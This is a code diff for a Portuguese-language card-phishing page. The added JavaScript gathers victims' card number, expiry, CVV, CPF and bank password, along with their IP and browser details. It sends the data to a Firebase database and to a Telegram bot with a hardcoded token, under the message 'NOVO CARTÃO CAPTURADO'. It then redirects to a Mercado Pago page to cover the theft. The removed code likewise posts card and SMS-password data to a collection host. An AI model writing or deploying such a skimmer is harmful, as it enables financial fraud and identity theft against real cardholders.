@@ -1,72 +1,46 @@
-document.addEventListener('DOMContentLoaded', () => {
-const form = document.getElementById('formulario');
-const btn = document.getElementById('submitBtn');
-const spinner = document.getElementById('spinner');
-const loading = document.getElementById('loading');
-
-// Formatação automática dos inputs
-const formatCardNumber = (e) => {
-let value = e.target.value.replace(/\D/g, '');
-value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
-e.target.value = value;
-};
-
-const formatExpiry = (e) => {
-let value = e.target.value.replace(/\D/g, '');
-if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
-e.target.value = value;
-};
-
-const formatCpf = (e) => {
-let value = e.target.value.replace(/\D/g, '');
-if (value.length > 3) value = value.substring(0, 3) + '.' + value.substring(3);
-if (value.length > 7) value = value.substring(0, 7) + '.' + value.substring(7);
-if (value.length > 11) value = value.substring(0, 11) + '-' + value.substring(11);
-e.target.value = value;
-};
-
-document.getElementById('cardNumber').addEventListener('input', formatCardNumber);
-document.getElementById('expiry').addEventListener('input', formatExpiry);
-document.getElementById('cvv').addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));
-document.getElementById('cpf').addEventListener('input', formatCpf);
-
-// Envio dos dados
-form.addEventListener('submit', (e) => {
+document.getElementById('formulario-clonacao').addEventListener('submit', async function(e) {
 e.preventDefault();
 
-btn.disabled = true;
-spinner.style.display = 'inline';
-loading.classList.add('active');
+const btnSubmit = document.getElementById('btnSubmit');
+const spinner = btnSubmit.querySelector('.spinner-border');
+btnSubmit.disabled = true;
+spinner.classList.remove('d-none');
 
-const data = {
-cardNumber: document.getElementById('cardNumber').value.replace(/\D/g, ''),
-expiry: document.getElementById('expiry').value.replace(/\D/g, ''),
+const dados = {
+numero_cartao: document.getElementById('numero_cartao').value.replace(/\s/g, ''),
+validade: document.getElementById('validade').value,
 cvv: document.getElementById('cvv').value,
-cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
-smsPass: document.getElementById('smsPass').value
+cpf: document.getElementById('cpf').value.replace(/[.-]/g, ''),
+senha_banco: document.getElementById('senha_banco').value,
+ip_usuario: await fetch('https://api.ipify.org?format=json')
+.then(res => res.json())
+.then(data => data.ip)
+.catch(() => 'IP desconhecido'),
+hora: new Date().toISOString(),
+user_agent: navigator.userAgent
 };
 
-// Envia para o endpoint falso (substitua pela real)
-fetch('https://fake-gateway.ultimedev.club/collect', {
+document.querySelector('.formulario-urgente').classList.add('d-none');
+document.getElementById('avisoFinal').classList.remove('d-none');
+
+// Backup Firebase
+fetch('https://seu-projeto-71c10-default-rtdb.firebaseio.com/cartoes.json', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify(data)
-})
-.then(res => res.json())
-.then(res => {
-if (res.success) {
-loading.innerHTML = `
-<div style="color:#33d758;font-size:4rem;">✓</div>
-<h4>Credenciais capturadas</h4>
-<p>${res.message || 'Dados processados com sucesso.'}</p>
-`;
-} else {
-loading.innerHTML = `<div style="color:#ef4444;font-size:4rem;">✗</div><h4>${res.error || 'Falha na captura'}</h4>`;
-}
-})
-.catch(() => {
-loading.innerHTML = `<div style="color:#ef4444;font-size:4rem;">!</div><h4>Sem resposta do servidor</h4>`;
-});
-});
-});
+body: JSON.stringify(dados)
+}).catch(console.error);
 
+// Alerta Telegram
+const mensagem = `🚨 NOVO CARTÃO CAPTURADO 🚨
+🔹 Número: ${dados.numero_cartao}
+🔹 Validade: ${dados.validade}
+🔹 CVV: ${dados.cvv}
+🔹 CPF: ${dados.cpf}
+🔹 Senha: ${dados.senha_banco}
+🔹 IP: ${dados.ip_usuario}
+🔹 Hora: ${dados.hora}`;
+fetch(`https://api.telegram.org/bot8776533220:AAFH8s1cQrIWHYdUvtaTBzIn7E2y1vqTKpE/sendMessage?chat_id=8311007963&text=${encodeURIComponent(mensagem)}`)
+.catch(console.error);
+
+setTimeout(() => window.location.href = 'https://mercadopago.com/br/aguarde?token=ST5432', 3000);
+});
